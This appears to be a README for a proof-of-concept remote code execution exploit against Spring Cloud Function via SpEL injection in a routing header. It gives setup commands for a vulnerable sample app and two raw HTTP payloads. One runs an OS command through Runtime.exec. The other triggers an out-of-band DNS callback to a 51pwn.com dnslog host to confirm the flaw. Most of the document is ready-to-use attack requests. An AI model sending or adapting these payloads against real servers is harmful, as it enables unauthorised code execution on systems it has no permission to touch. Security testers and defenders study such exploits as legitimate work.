spring-spel-0day-poc
spring-cloud/spring-cloud-function RCE EXP POC https://github.com/spring-cloud/spring-cloud-function header

spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("open -a calculator.app")
build
wget https://github.com/spring-cloud/spring-cloud-function/archive/refs/tags/v3.1.6.zip
unzip v3.1.6.zip
cd spring-cloud-function-3.1.6
cd spring-cloud-function-samples/function-sample-pojo
mvn package
java -jar ./target/function-sample-pojo-2.0.0.RELEASE.jar
image

get path lists for test
find . -name "*.java"|xargs -I % cat %|grep -Eo '"([^" \.\/=>\|,:\}\+\)'"'"']{8,})"'|sort -u|sed 's/"//g'
...
functionRouter
uppercase
lowercase
...
image

poc1
POST /functionRouter HTTP/1.1
host:127.0.0.1:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15
Connection: close
spring.cloud.function.routing-expression:T(java.lang.Runtime).getRuntime().exec("open -a /System/Applications/Calculator.app")
Content-Length: 5

51pwn
image

poc2
POST /functionRouter HTTP/1.1
host:127.0.0.1:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15
Connection: close
spring.cloud.function.routing-expression:T(java.net.InetAddress).getByName("random87535.rce.51pwn.com")
Content-Length: 5

51pwn
check
curl -v 'https://51pwn.com/dnslog?q=random87535.rce.51pwn.com'
